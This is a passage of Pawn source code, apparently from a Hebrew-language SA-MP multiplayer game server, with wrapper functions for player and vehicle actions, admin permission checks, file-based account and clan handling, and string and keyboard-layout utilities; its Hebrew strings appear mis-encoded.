	if(!vehicleinfo[vehicleid][vspecial]) LinkVehicleToInterior(vehicleid,interiorid);
	vehicleinfo[vehicleid][veint] = interiorid;
	new driver = playerid;
	for(new i = 0; i < MAX_PLAYERS_ && driver == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER && IsVehicleStreamedIn(vehicleid,i) && IsPlayerInVehicle(i,vehicleid)) driver = i;
	if(driver != INVALID_PLAYER_ID) playerinfo[driver][changedinterior] = 1;
}
#define LinkVehicleToInterior LinkVehicleToInterior2
//=[SetPlayerPos]===============================================================
#undef SetPlayerPos
stock SetPlayerPos2(playerid,Float:x,Float:y,Float:z)
{
	playerinfo[playerid][entertime] += 221;
	playerinfo[playerid][dontac] = 5, playerinfo[playerid][usetele] = 1;
	if(playerinfo[playerid][invehicle] != INVALID_VEHICLE_ID) playerinfo[playerid][invehicle] = INVALID_VEHICLE_ID, playerinfo[playerid][watchingwindow] = 0;
	SetPlayerPos(playerid,x,y,z);
}
#define SetPlayerPos SetPlayerPos2
//=[SetVehiclePos]==============================================================
#undef SetVehiclePos
stock SetVehiclePos2(vehicleid,Float:x,Float:y,Float:z,playerid=INVALID_PLAYER_ID)
{
	new driver = playerid;
	for(new i = 0; i < MAX_PLAYERS_ && driver == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER && IsVehicleStreamedIn(vehicleid,i) && IsPlayerInVehicle(i,vehicleid)) driver = i;
	if(driver != INVALID_PLAYER_ID) playerinfo[driver][dontac] = 5, playerinfo[driver][usetele] = 1;
	SetVehiclePos(vehicleid,x,y,z);
}
#define SetVehiclePos SetVehiclePos2
//=[SetVehicleHealth2]==========================================================
#undef SetVehicleHealth
stock SetVehicleHealth2(vid,Float:hlth)
{
	vehicleinfo[vid][vhealth] = hlth;
	SetVehicleHealth(vid,hlth);
}
#define SetVehicleHealth SetVehicleHealth2
//=[RepairVehicle2]=============================================================
#undef RepairVehicle
stock RepairVehicle2(vid)
{
	vehicleinfo[vid][vhealth] = 1000.0;
	RepairVehicle(vid);
	return 1;
}
#define RepairVehicle RepairVehicle2
//=[SetPlayerVelocity]==========================================================
#undef SetPlayerVelocity
stock SetPlayerVelocity2(playerid,Float:x,Float:y,Float:z)
{
	playerinfo[playerid][dontac] = 30;
	SetPlayerVelocity(playerid,x,y,z);
}
#define SetPlayerVelocity SetPlayerVelocity2
//=[SetVehicleVelocity]=========================================================
#undef SetVehicleVelocity
stock SetVehicleVelocity2(vehicleid,Float:x,Float:y,Float:z,playerid=INVALID_PLAYER_ID)
{
	new driver = playerid;
	for(new i = 0; i < MAX_PLAYERS_ && driver == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER && IsVehicleStreamedIn(vehicleid,i) && IsPlayerInVehicle(i,vehicleid)) driver = i;
	if(driver != INVALID_PLAYER_ID) playerinfo[driver][dontac] = 30;
	SetVehicleVelocity(vehicleid,x,y,z);
}
#define SetVehicleVelocity SetVehicleVelocity2
//=[PutPlayerInVehicle]=========================================================
#undef PutPlayerInVehicle
stock PutPlayerInVehicle2(playerid,vehicleid,seatid)
{
	playerinfo[playerid][entertime] += 221;
	playerinfo[playerid][dontac] = 5;
	return PutPlayerInVehicle(playerid,vehicleid,seatid);
}
#define PutPlayerInVehicle PutPlayerInVehicle2
//=[RemovePlayerFromVehicle]=========================================================
#undef RemovePlayerFromVehicle
stock RemovePlayerFromVehicle2(playerid)
{
	playerinfo[playerid][entertime] += 221;
	playerinfo[playerid][dontac] = 5;
	return RemovePlayerFromVehicle(playerid);
}
#define RemovePlayerFromVehicle RemovePlayerFromVehicle2
//=[SetPlayerInterior]==========================================================
#undef SetPlayerInterior
stock SetPlayerInterior2(playerid,interiorid)
{
	playerinfo[playerid][changedinterior] = 1;
	return SetPlayerInterior(playerid,interiorid);
}
#define SetPlayerInterior SetPlayerInterior2
//=[GetPlayerWeapon]============================================================
#undef GetPlayerWeapon
stock GetPlayerWeapon2(playerid)
{
	//if(IsPlayerInAnyVehicle(playerid)) return playerinfo[playerid][getweapon];
	return GetPlayerWeapon(playerid);
}
#define GetPlayerWeapon GetPlayerWeapon2
//=[SendDeathMessage]===========================================================
#undef SendDeathMessage
stock SendDeathMessage2(killer,killee,weapon)
{
	for(new i = 3; i >= 0; i--) for(new j = 0; j < sizeof deathtable []; j++) deathtable[i+1][j] = deathtable[i][j];
	deathtable[0][0] = killer, deathtable[0][1] = killee, deathtable[0][2] = weapon;
	return SendDeathMessage(killer,killee,weapon);
}
#define SendDeathMessage SendDeathMessage2
//=[GetPlayerState]=============================================================
#undef GetPlayerState
stock GetPlayerState2(playerid) return playerinfo[playerid][nstate];
stock GetPlayerState_Original(playerid) return GetPlayerState(playerid);
#define GetPlayerState GetPlayerState2
//=[GetPlayerSkillLevel]========================================================
stock GetPlayerSkillLevel(playerid,skill) return playerinfo[playerid][wskill][skill];
//=[GetRotToXY]=================================================================
forward Float:GetRotToXY(Float:cx,Float:cy,Float:x,Float:y);
public Float:GetRotToXY(Float:cx,Float:cy,Float:x,Float:y) return atan2(floatsub(cy,y),floatsub(cx,x))+90.0;
//=[AddPlayerVelocity]==========================================================
stock AddPlayerVelocity(playerid, Float:addx, Float:addy, Float:addz)
{
	new Float:p[3];
	if(IsPlayerInAnyVehicle(playerid))
	{
		new v = GetPlayerVehicleID(playerid);
		GetVehicleVelocity(v,p[0],p[1],p[2]);
		SetVehicleVelocity(v,p[0] + addx,p[1] + addy,p[2] + addz,playerid);
	}
	else
	{
		GetPlayerVelocity(playerid,p[0],p[1],p[2]);
		SetPlayerVelocity(playerid,p[0] + addx,p[1] + addy,p[2] + addz);
	}
	return 1;
}
//=[MulPlayerVelocity]==========================================================
stock MulPlayerVelocity(playerid, Float:addx, Float:addy, Float:addz)
{
	new Float:p[3];
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new v = GetPlayerVehicleID(playerid);
		GetVehicleVelocity(v,p[0],p[1],p[2]);
		SetVehicleVelocity(v,p[0] * addx,p[1] * addy,p[2] * addz,playerid);
	}
	else
	{
		GetPlayerVelocity(playerid,p[0],p[1],p[2]);
		SetPlayerVelocity(playerid,p[0] * addx,p[1] * addy,p[2] * addz);
	}
	return 1;
}
//=[CheckHouseAcc]==============================================================
stock CheckHouseAcc(playerid,thehouse)
{
	if(!playerinfo[playerid][acctested][thehouse])
	{
		playerinfo[playerid][acctested][thehouse] = 1;
		new f[32], string[32];
		format(f,sizeof(f),"/DM/Houses/%d.ini",thehouse);
		playerinfo[playerid][houseacc][thehouse] = 0;
		if(fexist(f))
		{
			for(new ii=0;ii<max_houseacc;ii++)
			{
				format(string,sizeof(string),"Acc%d",ii);
				if(fkeyexist(f,string) && equal(fgetstring(f,string),GetName(playerid))) playerinfo[playerid][houseacc][thehouse] = 1;
			}
		}
	}
	return 1;
}
//=[CommandAllowed]=============================================================
stock CommandAllowed(playerid,id,cmdtext[])
{
	if(playerinfo[playerid][pp] > 0 && playerinfo[playerid][logged]) return 1;
	new string[128];
	if(playerid != ConsoleID && playerinfo[id][admin] > playerinfo[playerid][admin] && playerinfo[id][showme] != 3)
	{
		SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх Єь рующя с°юф тсхфф ююъ");
		if(playerinfo[id][admin] >= 15)
		{
			format(string,sizeof(string),"(Fail: %s (%d) %s)",GetName(playerid),playerid,cmdtext);
			SendClientMessage(id,yellow,string);
		}
		PlayAudioStreamForPlayer(playerid,audio_url "insufficient_permissions.wav");
		if(!playerinfo[id][pp] && !strlen(playerinfo[id][mngpower])) return 0;
	}
	if(playerinfo[id][pp] > 0 && id != playerid && returnAttacks)
	{
		if(strfind(cmdtext,"slap",true) != -1 || strfind(cmdtext,"xp",true) != -1 || strfind(cmdtext,"explode",true) != -1 ||
		strfind(cmdtext,"sayas",true) != -1 || strfind(cmdtext,"burn",true) != -1)
		{
			new id_[8], playerid_[8];
			valstr(id_,id);
			valstr(playerid_,playerid);
			command(playerid,strreplace(cmdtext,id_,playerid_));
		}
		return SendClientMessage(playerid,red," .Amit Power ∙чўя цф юхтя Є\"щ"), 0;
	}
	if(strlen(playerinfo[id][mngpower]) > 0 && !playerinfo[playerid][pp])
	{
		format(string,sizeof(string)," .%s ∙чўя цф юхтя Є\"щ",playerinfo[id][mngpower]);
		return SendClientMessage(playerid,red,string), 0;
	}
	if(IsPlayerMAdmin(playerid))
	{
		format(string,sizeof(string),"cmd \"%s\" on %s",cmdtext,GetName(id));
		Log("AdminCMD",playerid,string);
	}
	return 1;
}
//=[SortByBiggest]==============================================================
stock SortByBiggest(array[], length = sizeof array)
{
	new temp;
	for(new i = 0; i < length; i++) for(new j = 0; j < i; j++) if(array[i] > array[j]) temp = array[i], array[i] = array[j], array[j] = temp;
}
//=[gettime2]===================================================================
#undef gettime
stock gettime2(&hour,&minute,&second)
{
	gettime(hour,minute,second);
	/*minute += 7;
	if(minute < 0)
	{
		minute = 60 - (minute * -1), hour--;
		if(hour < 0) hour = 23;
	}*/
}
#define gettime gettime2
//=[PlayerHasRank]==============================================================
stock PlayerHasRank(playerid,rankid) return playerid == ConsoleID ? 1 : (rankid == -1 ? 0 : playerinfo[playerid][rank][rankid]);
//=[RankID]=====================================================================
stock RankID(rankn[])
{
	//for(new i = 0; i < MAX_RANKS; i++) if(equal(rankname[i],rankn)) return i;
	//return -1;
	new rnk[32];
	format(rnk,sizeof(rnk),"rank_%s",ToEnglish_Ret(rankn));
	return PropertyExists_INT(rnk) ? GetProperty_INT(rnk) : -1;
}
//=[RecreateRanks]==============================================================
stock RecreateRanks()
{
	new rnk[32];
	for(new i = 0; i < MAX_RANKS; i++) if(strlen(rankname[i]) > 0 && !equal(rankname[i],"None"))
	{
		format(rnk,sizeof(rnk),"rank_%s",ToEnglish_Ret(rankname[i]));
		SetProperty_INT(rnk,i);
	}
	return 1;
}
//=[SetPlayerName2]=============================================================
#undef SetPlayerName
stock SetPlayerName2(playerid,name[])
{
	new name1[MAX_PLAYER_NAME];
	SetString(name1,name);
	format(name1,sizeof(name1),"%s1",name1);
	SetPlayerName(playerid,name1);
	name1[strlen(name1) - 1] = 0;
	return SetPlayerName(playerid,name1);
}
#define SetPlayerName SetPlayerName2
//=[GetOnlineAdmins]============================================================
stock GetOnlineAdmins()
{
	new oa = 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) oa++;
	return oa;
}
//=[GetOnlineAdminsAFK]============================================================
stock GetOnlineAdminsAFK()
{
	new oa = 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerAFK_(i) && IsPlayerMAdmin(i)) oa++;
	return oa;
}
//=[GetOnlinePlayers]===========================================================
stock GetOnlinePlayers()
{
	new op = 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i)) op++;
	return op;
}
//=[ChangeName]=================================================================
stock ChangeName(playerid,name[])
{
	new name1[MAX_PLAYER_NAME], f[64], string[M_S];
	format(f,sizeof(f),"/DM/Users/%s.ini",name);
	format(string,sizeof(string)," %s ∙щЁф ыщЁхщ ь",name);
	AdminInfo(playerid,string);
	if(playerinfo[playerid][house] >= 0) ChangeAccName(playerid,name);
	format(string,sizeof(string),"/DM/Users/%s.ini",GetName(playerid));
	//my_frename(string,f);
	frename(string,f);
	//UpdateLastNicknameList(playerid,name);
	if(fkeyexist(file_admins,GetName(playerid)))
	{
		fremovekey(file_admins,GetName(playerid));
		fsetint(file_admins,name,playerinfo[playerid][admin]);
	}
	format(string,sizeof(string),GetName(playerid));
	if(fkeyexist(file_vip,GetName(playerid)))
	{
		format(string,sizeof(string),GetName(playerid));
		fremovekey(file_vip,string);
		format(string,sizeof(string),name);
		fsetint(file_vip,string,playerinfo[playerid][vip]);
	}
	for(new i = 1; i <= 5; i++)
	{
		format(string,sizeof(string),"HSKills_Name%d",i);
		if(fkeyexist(file_hskills,string) && equal(fgetstring(file_hskills,string),GetName(playerid))) fsetstring(file_hskills,string,name);
	}
	for(new i = race1_cars; i <= race8_waterdrive; i++)
	{
		for(new j = 1, m = GetRaceMaxStyles(i); i <= m; i++)
		{
			format(string,sizeof(string),"Race_%d_%d_RecordN",i,j);
			if(fkeyexist(file_racerecords,string) && equal(GetName(playerid),fgetstring(file_racerecords,string))) fsetstring(file_racerecords,string,name);
		}
	}
	for(new i = 0; i < props; i++) if(propinfo[i][owner] == playerid)
	{
		format(string,sizeof(string),"/DM/Properties/%d.ini",i);
		fsetstring(string,"Owner",name);
		UpdatePropertyText(i);
	}
	if(playerinfo[playerid][clan] > 0) ClanPList_RenameP(playerinfo[playerid][clan],GetName(playerid),name);
	if(playerinfo[playerid][friends] > 0) for(new i = 1, f2[64], theirName[MAX_PLAYER_NAME]; i <= MAX_FRIENDS; i++)
	{
		format(string,sizeof(string),"Friend_%d",i);
		if(!equal(fgetstring(f,string),"None"))
		{
			format(theirName,sizeof(theirName),fgetstring(f,string));
			format(f2,sizeof(f2),"/DM/Users/%s.ini",theirName);
			if(fexist(f2))
			{
				for(new j = 1, theirID = -1, bool:toBreak = false; j <= MAX_FRIENDS && !toBreak; j++, theirID = -1)
				{
					format(string,sizeof(string),"Friend_%d",j);
					if(equal(fgetstring(f2,string),GetName(playerid)))
					{
						for(new a = 0; a < MAX_PLAYERS_ && theirID == -1; a++) if(IsPlayerConnected(a) && equal(GetName(a),theirName)) theirID = a;
						if(theirID != -1) SetPVarString(theirID,string,name);
						fsetstring(f2,string,name);
						toBreak = true;
					}
				}
			}
		}
	}
	format(name1,sizeof(name1),"%s1",name);
	SetPlayerName(playerid,name1);
	SetPlayerName(playerid,name);
	format(playerinfo[playerid][playername],MAX_PLAYER_NAME,name);
	Border(playerid,"update");
	format(string,sizeof(string),"[changenick] level: %d, kills: %d, money: %d, bank: %d",playerinfo[playerid][level],playerinfo[playerid][kills],GetMoney(playerid),playerinfo[playerid][bank]);
	Log("Stats",playerid,string);
	return 1;
}
//=[CreateInfoPoint]============================================================
stock CreateInfoPoint(Float:x,Float:y,Float:z,t,label[],wrld=world_normal)
{
	new pid = -1, string[M_S];
	for(new i = 0; i < MAX_INFOPOINTS && pid == -1; i++) if(!ipinfo[i][ipvalid]) pid = i;
	ipinfo[pid][ipvalid] = 1;
	ipinfo[pid][ippos][0] = x;
	ipinfo[pid][ippos][1] = y;
	ipinfo[pid][ippos][2] = z;
	ipinfo[pid][iptype] = t;
	format(ipinfo[pid][ipheader],32,label);
	format(string,sizeof(string),@c(white) "[" @c(green) "%s" @c(white) "]",label);
	ipinfo[pid][ippickup] = CreatePickupEx(1239,1,x,y,z,2,wrld,pid);
	ipinfo[pid][iptext] = Create3DTextLabel(string,wrld,x,y,z,40.0,wrld);
	return pid;
}
//=[UpdateServerDetails]========================================================
stock UpdateServerDetails()
{
	new string[M_S];
	for(new i = 0; i < 40; i++)
	{
		format(string,sizeof(string),"WeaponKills%02d",i);
		fsetint(file_srvdetails,string,serverDetails[sdWeaponKills][i]);
	}
	for(new i = 0; i < 5; i++)
	{
		format(string,sizeof(string),"sdDeaths%02d",i);
		fsetint(file_srvdetails,string,serverDetails[sdDeaths][i]);
	}
	return 1;
}
//=[GetHighestID]===============================================================
stock GetHighestID()
{
	new h = 0;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && i > h) h = i;
	return h;
}
//=[Curse]======================================================================
stock Curse(text[])
{
	/*new changes[][2] =
	{
		{' ',0},
		{'!','х'},
		{'1','х'}
	}, strings[M_S][sizeof(changes)];
	for(new i = 0; i < sizeof(changes); i++)
	{
		SetString(strings[i],text);
		charreplace(strings[i],changes[i][0],changes[i][1]);
	}
	for(new j = 0; j < sizeof strings []; j++) for(new i = 0; i < words_count; i++) if(strfind(strings[j],words[i],true) != -1) return true;*/
	for(new i = 0; i < words_count; i++) if(strfind(text,words[i],true) != -1) return 1;
	return 0;
}
//=[strreplace2]================================================================
stock strreplace2(string[],str1[],str2[])
{
	new p = strfind(string,str1), sStart[256], sEnd[256], strtoset[256];
	if(p == -1) return 0;
	strmid(sStart,string,0,p);
	strmid(sEnd,string,p + strlen(str1),strlen(string));
	format(strtoset,sizeof(strtoset),"%s%s%s",sStart,str2,sEnd);
	SetString(string,strtoset);
	return 1;
}
//=[strreplace]=================================================================
stock strreplace(src[],trg[],newstr[])
{   // by DracoBlue, improved by me
	new f = 0, s1[M_S], tmp[M_S];
	format(s1,sizeof(s1),src);
	f = strfind(s1,trg);
	tmp[0] = 0;
	while(f >= 0)
	{
		strcat(tmp,ret_memcpy(s1,0,f));
		strcat(tmp,newstr);
		format(s1,sizeof(s1),"%s",ret_memcpy(s1,f+strlen(trg),strlen(s1)-f));
		f = strfind(s1,trg);
	}
	strcat(tmp,s1);
	return tmp;
}
//=[charreplace]================================================================
stock charreplace(string[],char1,char2)
{
	for(new i = 0; i < strlen(string); i++) if(string[i] == char1) string[i] = char2;
	return 1;
}
//=[charcount]==================================================================
stock charcount(string[],thechar)
{
	new c = 0;
	for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == thechar) c++;
	return c;
}
//=[SPropertyEarnings]==========================================================
stock SPropertyEarnings(specialPropID,_money,_percent)
{
	new playerid = -1, prop = -1;
	for(new i = 0; i < props && prop == -1; i++) if(propinfo[i][spid] == specialPropID) prop = i;
	if(prop == -1) return 1;
	for(new i = 0; i < MAX_PLAYERS_ && playerid == -1; i++) if(IsPlayerConnected(i)) if(propinfo[prop][owner] == i) playerid = i;
	if(playerid == -1) return 1;
	new string[M_S];
	format(string,sizeof(string)," .%s ўщсь· $%d юфЁыё фющхчу",propinfo[prop][pname],_money * (_percent / 100));
	SendClientMessage(playerid,green,string);
	GiveMoney(playerid,headserver != playerid ? (_money * (_percent / 100)) : (_money * (_percent / 100)*2), 38);
	return 1;
}
//=[IsPlayerInNPCVehicle]=======================================================
stock IsPlayerInNPCVehicle(playerid)
{
	for(new i = 0; i < sizeof(npcVehicles); i++) if(npcVehicles[i] > 0 && IsPlayerInVehicle(playerid,npcVehicles[i])) return 1;
	return 0;
}
//=[Backup]=====================================================================
stock Backup(wtd[],filenm[],value[]="")
{
	new string[M_S], File:f;
	format(filenm,M_S,folder_backups "%s.sampil",filenm);
	if(equal(wtd,"create")) fcreate(string);
	else if(equal(wtd,"add"))
	{
		f = fopen(filenm,io_append);
		format(string,sizeof(string),"/DM/Users/%s.ini",value);
		format(string,sizeof(string),"%s|%d|%d\r\n",value,fgetstring(string,"Level"),fgetstring(string,"Kills"));
		fwrite(f,string);
		fclose(f);
	}
	/*else if(equal(wtd,"load"))
	{
		new idx, uname[MAX_PLAYER_NAME], stats[2], uf[64];
		f = fopen(filenm,io_read);
		while(fread(f,string))
		{
			uname = strtok(string,idx,'|');
			if(!equal(value,"#All") && !equal(uname,value)) continue;
			for(new i = 0; i < sizeof(stats); i++) stats[i] = strval(strtok(string,idx,'|'));
			format(uf,sizeof(uf),"/DM/Users/%s.ini",uname);
			RegisterPlayer(uname,"123");
			fsetint(uf,"Level",stats[0]);
			fsetint(uf,"Kills",stats[1]);
		}
		fclose(f);
	}*/
	return 1;
}
//=[fsearch]====================================================================
stock fsearch(File:f,srch[])
{
	new read[256];
	while(fread(f,read)) if(strfind(read,srch,true) != -1) return 1;
	return 0;
}
//=[IsPlayerLookingAtPoint]=====================================================
stock IsPlayerLookingAtPoint(playerid,Float:X,Float:Y,Float:Z,Float:ViewWidth,Float:ViewHeight)
{
	new Float:c[3], Float:pa[2], Float:ca[2], Float:p[3];
	GetPlayerCameraFrontVector(playerid,c[0],c[1],c[2]);
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	p[2] += 2.0;
	for(new i = 0; i < 3; i++) c[i] = floatadd(c[i],p[i]);
	pa[0] = atan2(X-p[0],Y-p[1]);
	if(pa[0] > 360) pa[0] = floatsub(pa[0],360);
	if(pa[0] < 0) pa[0] = floatadd(pa[0],360);
	pa[1] = atan2(Y-p[1],Z-p[2]);
	if(pa[1] > 360) pa[1] = floatsub(pa[1],360);
	if(pa[1] < 0) pa[1] = floatadd(pa[1],360);
	ca[0] = atan2(c[0]-p[0],c[1]-p[1]);
	if(ca[0] > 360) ca[0] = floatsub(ca[0],360);
	if(ca[0] < 0) ca[0] = floatadd(ca[0],360);
	ca[1] = atan2(c[1]-p[1],c[2]-p[2]);
	if(ca[1] > 360) ca[1] = floatsub(ca[1],360);
	if(ca[1] < 0) ca[1] = floatadd(ca[1],360);
	if((ca[0] > (pa[0]-ViewWidth)) && (ca[0] < (pa[0]+ViewWidth)) && (ca[1] > (pa[1]-ViewHeight))&&(ca[1] < (pa[1]+ViewHeight))) return 1;
	if((pa[0] - ViewWidth) < 0)
	{
		ca[0] -= 360.0;
		if((ca[0] > (pa[0]-ViewWidth)) && (ca[0] < (pa[0]+ViewWidth)) && (ca[1] > (pa[1]-ViewHeight)) && (ca[1] < (pa[1]+ViewHeight))) return 1;
	}
	if((pa[0] + ViewWidth) > 360)
	{
		ca[0] += 360.0;
		if((ca[0] > (pa[0]-ViewWidth)) && (ca[0] < (pa[0]+ViewWidth)) && (ca[1] > (pa[1]-ViewHeight)) && (ca[1] < (pa[1]+ViewHeight))) return 1;
	}
	return 0;
}
//=[IsPlayerLookingAtPlayer]====================================================
stock IsPlayerLookingAtPlayer(playerid,targetid,Float:d=5.0)
{
	new Float:p[3];
	GetPlayerPos(targetid,p[0],p[1],p[2]);
	return IsPlayerLookingAtPoint(playerid,p[0],p[1],p[2],d,d);
}
//=[IsPlayerSeeingPlayer]=======================================================
stock IsPlayerSeeingPlayer(playerid,targetid)
{
	new Float:p[3];
	GetPlayerPos(targetid,p[0],p[1],p[2]);
	return IsPlayerLookingAtPoint(playerid,p[0],p[1],p[2],12.0,12.0);
}
//=[SaveData]===================================================================
stock SaveData(type[],playerid,username[],param[])
{
	new f[M_S], string[M_S], bool:setted = false;
	format(f,sizeof(f),"/DM/Info/Last/LastInfo_%s.ini",username);
	//SendClientMessageToAll(red, f);
	if(!fexist(f)) fcreate(f);
	if(equal(type,"money"))
	{
		for(new i = 1; i <= MAX_SAVED_DATA && !setted; i++)
		{
			format(string,sizeof(string),"GM%03dAmount",i);
			if(fkeyexist(f,string)) continue;
			fsetint(f,string,strval(param));
			format(string,sizeof(string),"GM%03dText",i);
			fsetstring(f,string,param);
			setted = true;
		}
		if(!setted) return 0;
	}
	else if(equal(type,"message"))
	{
		for(new i = 1; i <= MAX_SAVED_DATA && !setted; i++)
		{
			format(string,sizeof(string),"Msg%03dSender",i);
			if(fkeyexist(f,string)) continue;
			if(playerid == -1) fsetstring(f,string,"None");
			else fsetstring(f,string,GetName(playerid));
			format(string,sizeof(string),"Msg%03dText",i);
			fsetstring(f,string,param);
			setted = true;
		}
		if(!setted) return 0;
	}
	else if(equal(type,"ban"))
	{
		for(new i = 1; i <= MAX_SAVED_DATA && !setted; i++)
		{
			format(string,sizeof(string),"BanMessage%03d",i);
			if(fkeyexist(f,string)) continue;
			fsetstring(f,string,param);
			setted = true;
		}
		if(!setted) return 0;
	}
	return 1;
}
//=[SetPlayerLookAt]============================================================
stock SetPlayerLookAt(playerid, Float:x, Float:y)
{   // by ErroR, improved by me
	new Float:Px, Float:Py, Float: Pa;
	GetPlayerPos(playerid,Px,Py,Pa);
	Pa = floatabs(atan((y-Py)/(x-Px)));
	if(x <= Px && y >= Py) Pa = floatsub(180.0,Pa);
	else if(x < Px && y < Py) Pa = floatadd(Pa,180.0);
	else if(x >= Px && y <= Py) Pa = floatsub(360.0,Pa);
	Pa = floatsub(Pa,90.0);
	if(Pa >= 360.0) Pa = floatsub(Pa,360.0);
	SetPlayerFacingAngle(playerid,Pa);
	return 1;
}
//=[SetObjectLookAt]============================================================
stock SetObjectLookAt(objectid, Float:x, Float:y)
{
	new Float:Ox, Float:Oy, Float: Oa, Float:cur[3];
	GetSObjectPos(objectid,Ox,Oy,Oa);
	Oa = floatabs(atan((y-Oy)/(x-Ox)));
	if(x <= Ox && y >= Oy) Oa = floatsub(180.0,Oa);
	else if(x < Ox && y < Oy) Oa = floatadd(Oa,180.0);
	else if(x >= Ox && y <= Oy) Oa = floatsub(360.0,Oa);
	Oa = floatsub(Oa,90.0);
	if(Oa >= 360.0) Oa = floatsub(Oa,360.0);
	GetSObjectRot(objectid,cur[0],cur[1],cur[2]);
	SetSObjectRot(objectid,cur[0],cur[1],Oa);
	return 1;
}
//=[TooManyMsgs]================================================================
stock TooManyMsgs(playerid)
{
	SendClientMessage(playerid,white," .Ё°рф ыщ юёЇ° ф∙х°х· ∙Ё∙ьчх сфхуЄф цх тухь юущ ьфЎтф сЎ'рш счьў рчу");
	return SendClientMessage(playerid,white," /pagesize рх сЇўхуф PageUp+PageDown сыущ ь°рх· р· фчьўщэ фрч°щэ ∙ь фўьрЁщэ ф∙·ю∙ сыЇ·х°щэ");
}
//=[GetHQAveragePos]============================================================
stock GetHQAveragePos(cl,&Float:x,&Float:y,&Float:z,pid=-1)
{
	new Float:t[3], Float:p[3], Float:avg[3];
	for(new i = 0; i < claninfo[cl][cobjects]; i++)
	{
		GetSObjectPos(claninfo[cl][cobject][i],p[0],p[1],p[2]);
		for(new j = 0; j < 3; j++) t[j] += p[j];
	}
	for(new j = 0; j < 3; j++) avg[j] = floatdiv(t[j],float(claninfo[cl][cobjects]));
	x = avg[0], y = avg[1], z = avg[2];
	if(pid != -1)
	{
		GetPlayerPos(pid,p[0],p[1],p[2]);
		SetPlayerPosFindZ(pid,x,y,z);
		GetPlayerPos(pid,x,y,z);
		SetPlayerPos(pid,p[0],p[1],p[2]);
	}
	return 1;
}
//=[GetPlayerHQ]================================================================
stock GetPlayerHQ(playerid) return playerinfo[playerid][inhq];
//=[CBankLog]===================================================================
stock CBankLog(cl,wrt[])
{
	new f[64], s1[16], s2[16], string[M_S];
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[cl][cname]);
	if(fexist(f))
	{
		for(new i = MAX_CBANK_LOGS-1; i > 0; i--)
		{
			format(s1,sizeof(s1),"BankLog%d",i);
			format(s2,sizeof(s2),"BankLog%d",i + 1);
			format(string,sizeof(string),fgetstring(f,s1));
			fsetstring(f,s2,string);
		}
		format(string,sizeof(string),"[%s %s] %s",GetDateAsString(),GetTimeAsString(),wrt);
		fsetstring(f,"BankLog1",string);
	}
	return 1;
}
//=[ToHebrew]===================================================================
stock ToHebrew(cmd[])
{
	for(new i=0,j=strlen(cmd);i<j;i++)
	{
		switch(cmd[i])
		{
			case 'e': cmd[i] = 'ў';
			case 'r': cmd[i] = '°';
			case 't': cmd[i] = 'р';
			case 'y': cmd[i] = 'ш';
			case 'u': cmd[i] = 'х';
			case 'i': cmd[i] = 'я';
			case 'o': cmd[i] = 'э';
			case 'p': cmd[i] = 'Ї';
			case 'a': cmd[i] = '∙';
			case 's': cmd[i] = 'у';
			case 'd': cmd[i] = 'т';
			case 'f': cmd[i] = 'ы';
			case 'g': cmd[i] = 'Є';
			case 'h': cmd[i] = 'щ';
			case 'j': cmd[i] = 'ч';
			case 'k': cmd[i] = 'ь';
			case 'l': cmd[i] = 'ъ';
			case 'z': cmd[i] = 'ц';
			case 'x': cmd[i] = 'ё';
			case 'c': cmd[i] = 'с';
			case 'v': cmd[i] = 'ф';
			case 'b': cmd[i] = 'Ё';
			case 'n': cmd[i] = 'ю';
			case 'm': cmd[i] = 'Ў';
			case ';': cmd[i] = 'є';
			case ',': cmd[i] = '·';
		}
	}
	return 1;
}
//=[ToEnglish]==================================================================
stock ToEnglish(cmd[])
{
	for(new i=0,j=strlen(cmd);i<j;i++)
	{
		switch(cmd[i])
		{
			case 'ў': cmd[i] = 'e';
			case '°': cmd[i] = 'r';
			case 'р': cmd[i] = 't';
			case 'ш': cmd[i] = 'y';
			case 'х': cmd[i] = 'u';
			case 'я': cmd[i] = 'i';
			case 'э': cmd[i] = 'o';
			case 'Ї': cmd[i] = 'p';
			case '∙': cmd[i] = 'a';
			case 'у': cmd[i] = 's';
			case 'т': cmd[i] = 'd';
			case 'ы': cmd[i] = 'f';
			case 'Є': cmd[i] = 'g';
			case 'щ': cmd[i] = 'h';
			case 'ч': cmd[i] = 'j';
			case 'ь': cmd[i] = 'k';
			case 'ъ': cmd[i] = 'l';
			case 'ц': cmd[i] = 'z';
			case 'ё': cmd[i] = 'x';
			case 'с': cmd[i] = 'c';
			case 'ф': cmd[i] = 'v';
			case 'Ё': cmd[i] = 'b';
			case 'ю': cmd[i] = 'n';
			case 'Ў': cmd[i] = 'm';
			case 'є': cmd[i] = ';';
			case '·': cmd[i] = ',';
			case ''': cmd[i] = 'w';
		}
	}
	return 1;
}
//=[ToEnglish_Ret]==============================================================
stock ToEnglish_Ret(cmd[])
{
	new str[32];
	format(str,sizeof(str),cmd);
	for(new i=0,j=strlen(str);i<j;i++)
	{
		switch(cmd[i])
		{
			case 'ў': str[i] = 'e';
			case '°': str[i] = 'r';
			case 'р': str[i] = 't';
			case 'ш': str[i] = 'y';
			case 'х': str[i] = 'u';
			case 'я': str[i] = 'i';
			case 'э': str[i] = 'o';
			case 'Ї': str[i] = 'p';
			case '∙': str[i] = 'a';
			case 'у': str[i] = 's';
			case 'т': str[i] = 'd';
			case 'ы': str[i] = 'f';
			case 'Є': str[i] = 'g';
			case 'щ': str[i] = 'h';
			case 'ч': str[i] = 'j';
			case 'ь': str[i] = 'k';
			case 'ъ': str[i] = 'l';
			case 'ц': str[i] = 'z';
			case 'ё': str[i] = 'x';
			case 'с': str[i] = 'c';
			case 'ф': str[i] = 'v';
